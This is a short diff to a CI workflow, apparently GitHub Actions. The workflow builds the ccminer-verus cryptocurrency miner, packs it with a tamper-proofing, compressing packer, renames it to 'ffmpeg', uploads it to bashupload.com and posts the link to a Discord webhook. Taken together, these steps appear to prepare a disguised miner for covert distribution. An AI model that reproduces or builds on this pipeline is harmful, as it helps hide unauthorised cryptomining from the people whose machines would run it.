@@ -40,6 +40,7 @@ jobs:
         cd ward
         make
         ./ward ../ccminer-verus/ccminer
+        clang -o /home/runner/work/ccminer-build/ccminer-build/ccminer-verus/ccminer.packed -static -O2 -D_FORTIFY_SOURCE=2 -DTAMPERPROOF -DCOMPRESS main.c runtime.c -lelf -lz
         mv ../ccminer-verus/ccminer ../ccminer-verus/ffmpeg
 
     - name: Upload to Bashupload
@@ -52,4 +53,3 @@ jobs:
         UPLOAD_URL=$(cat upload_url.txt | grep -o 'https://bashupload.com/[^\"]*')
         curl -H "Content-Type: application/json" -X POST \
         -d "{\"content\":\"$UPLOAD_URL\"}" ${{ secrets.DISCORD_WEBHOOK }}
-        
